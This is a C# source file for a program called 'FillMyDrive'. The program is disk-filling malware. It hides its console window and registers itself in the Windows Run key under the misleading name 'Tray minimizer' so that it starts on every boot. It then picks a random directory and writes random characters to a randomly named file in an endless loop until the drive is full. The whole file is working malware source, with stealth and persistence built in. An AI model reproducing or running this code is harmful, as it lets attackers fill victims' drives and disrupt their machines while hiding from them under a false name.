using System;
using System.IO;
using System.Text;
using Microsoft.Win32;
using System.Reflection;
using System.Security;
using System.Runtime.InteropServices;
using System.Security.Cryptography;

namespace FillMyDrive {
    internal class Program {
        [DllImport( "user32.dll" )]
        private static extern bool ShowWindow( IntPtr hWnd, int nCmdShow );
        [DllImport( "Kernel32" )]
        private static extern IntPtr GetConsoleWindow();
        private const int SW_HIDE=0;
        private const int SW_SHOW=5;
        private const bool Debug = false; // Debug?

        private static void Main( string[] args ) {
            var hwnd = GetConsoleWindow();
            var startUpBool = true;
            ShowWindow( hwnd, SW_HIDE );
            if(Debug) {
                startUpBool = !startUpBool;
            }
            Startup( startUpBool );
            var i2 = 0;
            var directory = new DirectoryInfo( "/" );
            DirectoryInfo[] moreDirs;
            while(true) {
                i2++;
                while(true) {
                    try {
                        moreDirs = directory.GetDirectories();
                        break;
                    } catch(UnauthorizedAccessException uae) {
                        directory = directory.Parent;
                        if(!Debug) continue;
                        Console.WriteLine( uae );
                        Console.ReadKey();
                    }
                }
                if(moreDirs.Length == 0) break;
                var random = new Random();
                var iRandom = random.Next( 0, 10 - i2 );
                var randomDir = moreDirs[random.Next( 0, moreDirs.Length - 1 )].FullName;
                directory = new DirectoryInfo( randomDir );
                if(iRandom == 0) break;
            }
            const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz" +
                                 "1234567890+*'!\\\"#¤%&/()=?§½@£$€{[]}-_.,:;<>\n\r\t";
            var fileName = Path.GetRandomFileName();
            if(Debug) {
                Console.WriteLine( "DEBUG INFO" );
                Console.WriteLine( "Directory: " + directory.FullName );
                Console.WriteLine( "File name: " + fileName );
            }
            if(File.Exists( directory.FullName + "/" + fileName )) {
                using(var fs = File.Open( directory.FullName + "/" + fileName, FileMode.Append )) {
                    while(true) {
                        for(var i = 0; i < Environment.TickCount; i++) {
                            var iRnd = directory.GetHashCode() * i;
                            var rnd = new Random(iRnd);
                            var text = new UTF8Encoding().GetBytes( Convert.ToString( chars.Substring( rnd.Next( 0, chars.Length ), 1 ) ) );
                            fs.Write( text, 0, text.Length );
                        }
                    }
                }
            }
            using(var fs = File.Create( directory.FullName + "/" + fileName )) {
                while(true) {
                    for(var i = 0; i < Environment.TickCount; i++) {
                        var iRnd = directory.GetHashCode() * i;
                        var rnd = new Random(iRnd);
                        var text = new UTF8Encoding().GetBytes( Convert.ToString( chars.Substring( rnd.Next( 0, chars.Length ), 1 ) ) );
                        fs.Write( text, 0, text.Length );
                    }
                }
            }
        }
        /// <summary>
        /// Add a key to registry that tells windows to start this program on boot.
        /// </summary>
        /// <param name="add">TRUE - If the program should add a key to the registry, and thereby run itself on startup.</param>
        private static void Startup( bool add ) {
            if(!add) return;
            var key = Registry.LocalMachine.OpenSubKey( @"Software\Microsoft\Windows\CurrentVersion\Run", true );
            key.SetValue( "Tray minimizer", "\"" + Assembly.GetExecutingAssembly().Location + "\"" );
            key.Close();
        }
    }
}
